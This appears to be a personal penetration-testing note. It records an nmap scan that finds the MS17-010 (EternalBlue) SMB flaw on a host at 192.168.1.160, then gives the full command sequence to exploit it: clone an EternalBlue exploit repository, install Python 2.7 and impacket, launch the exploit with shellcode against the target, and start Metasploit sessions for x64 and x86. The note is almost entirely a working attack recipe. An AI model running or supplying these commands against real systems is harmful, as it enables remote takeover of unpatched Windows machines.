url=192.168.1.160

nmap

```nmap
smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```


```sh
mkdir tmp_6FeZ
cd tmp_6FeZ
git clone https://github.com/REPTILEHAUS/Eternal-Blue.git
cd Eternal-Blue
nano start.sh
./start.sh
sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git --fix-missing
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zshrc
echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init --path)"\nfi' >> ~/.zshrc
[ -z "$SHELL" ] && SHELL=/usr/bin/zsh
exec $SHELL
pyenv install 2.7.18
pyenv global 2.7.18
exec $SHELL
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python2.7 get-pip.py
python2.7 -m pip install impacket==0.10.0
python2.7 /tmp/tmp_6FeZ/Eternal-Blue/eternalblue_exploit7.py 192.168.1.160 /tmp/tmp_6FeZ/Eternal-Blue/bin/sc_all.bin 3

## x64 Session:

msfconsole -r "/tmp/tmp_6FeZ/Eternal-Blue/output/EternalBlueX64.rc"

## x86 Session

msfconsole -r "/tmp/tmp_6FeZ/Eternal-Blue/output/EternalBlueX86.rc"
```